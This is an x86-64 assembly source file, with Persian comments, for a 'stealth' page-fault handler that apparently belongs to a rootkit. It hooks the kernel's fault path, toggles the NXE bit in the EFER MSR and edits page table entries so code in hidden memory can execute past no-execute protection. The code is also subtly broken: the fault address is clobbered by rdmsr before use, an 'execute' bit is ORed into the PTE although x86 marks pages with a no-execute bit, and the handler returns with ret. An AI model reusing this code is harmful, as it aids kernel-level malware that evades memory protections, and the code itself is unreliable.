section .text
global stealth_page_fault_handler

%include "stealth.inc"

stealth_page_fault_handler:
    ; بررسی آیا خطای صفحه مربوط به حافظه استیلث است
    test rcx, 0x04               ; بررسی بیت User/Supervisor
    jz .not_stealth
    mov rax, cr2                 ; آدرس خطا
    call is_stealth_page
    test al, al
    jz .not_stealth

    ; بایپس NXE با دستکاری EFER
    mov ecx, MSR_EFER
    rdmsr
    and eax, ~EFER_NXE           ; غیرفعال‌کردن NXE
    wrmsr

    ; دستکاری PTE برای افزودن دسترسی اجرا
    mov rdi, rax                 ; آدرس مجازی
    call get_pte_address
    or qword [rax], PTE_EXECUTE  ; افزودن بیت اجرا
    invlpg [rdi]                 ; اعتبارسنجی TLB

    ; بازگردانی EFER
    mov ecx, MSR_EFER
    rdmsr
    or eax, EFER_NXE             ; فعال‌کردن مجدد NXE
    wrmsr

    ret

.not_stealth:
    ; انتقال به هندلر اصلی
    jmp qword [orig_page_fault_handler]
   
get_pte_address:
    ; محاسبه آدرس PTE از آدرس مجازی
    mov rax, rdi
    shr rax, 9
    and rax, 0x7FFFFFFFF8
    add rax, [pml4_base]
    ret
    